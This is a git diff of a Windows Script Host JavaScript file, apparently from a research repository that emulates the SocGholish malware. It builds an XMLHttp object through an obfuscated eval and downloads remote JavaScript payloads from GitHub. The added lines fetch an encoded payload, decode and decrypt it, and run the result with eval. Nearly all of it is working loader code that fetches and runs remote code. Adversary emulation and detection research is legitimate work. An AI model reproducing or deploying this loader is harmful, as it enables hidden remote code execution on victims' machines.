@@ -70,14 +70,16 @@ var XmlHttp_Object = eval(_a0x2346);
 
 // URL of the JavaScript file on GitHub
 var githubFileUrl1 = "https://raw.githubusercontent.com/alekzandr/Research/main/SocGholish%20Tests/Version%202/Payload2.js";
-var githubFileUrl2 = "https://raw.githubusercontent.com/alekzandr/Research/main/SocGholish%20Tests/Version%202/Payload2.js";
+var githubFileUrl2 = "https://raw.githubusercontent.com/alekzandr/Research/main/SocGholish%20Tests/encoded-payload.txt";
 
 // Open a GET request
-XmlHttp_Object.open("GET", githubFileUrl, false); // 'false' for synchronous request
+XmlHttp_Object.open("GET", githubFileUrl1, false); // 'false' for synchronous request
 
 // Send the request
 XmlHttp_Object.send();
 
+
+// Start WScript
 if (XmlHttp_Object.status === 200) {
     var scriptContent = XmlHttp_Object.responseText;
     
@@ -95,3 +97,30 @@ if (XmlHttp_Object.status === 200) {
 } else {
     WScript.Echo("Failed to download the script. HTTP Status: " + XmlHttp_Object.status);
 }
+
+var XmlHttp_Object = eval(_a0x2346);
+
+// Open a GET request
+XmlHttp_Object.open("GET", githubFileUrl2, false); // 'false' for synchronous request
+
+// Send the request
+XmlHttp_Object.send();
+
+if (XmlHttp_Object.status === 200) {
+    // Successfully retrieved the file
+    var fileContent = XmlHttp_Object.responseText;
+    // WScript.Echo("File content:\n" + fileContent);
+
+    // Optional: If you want to execute the fetched JavaScript content
+    // Be cautious with using eval, especially with content fetched from the internet
+    // eval(fileContent);
+} else {
+    // Handle errors, e.g., file not found or network issues
+    console.error("Error fetching file: HTTP status " + XmlHttp_Object.status);
+}
+
+var payload = decrypt(decode(fileContent), 4);
+// WScript.Echo(fileContent);
+// WScript.Echo(payload);
+this[eval(payload)];
+
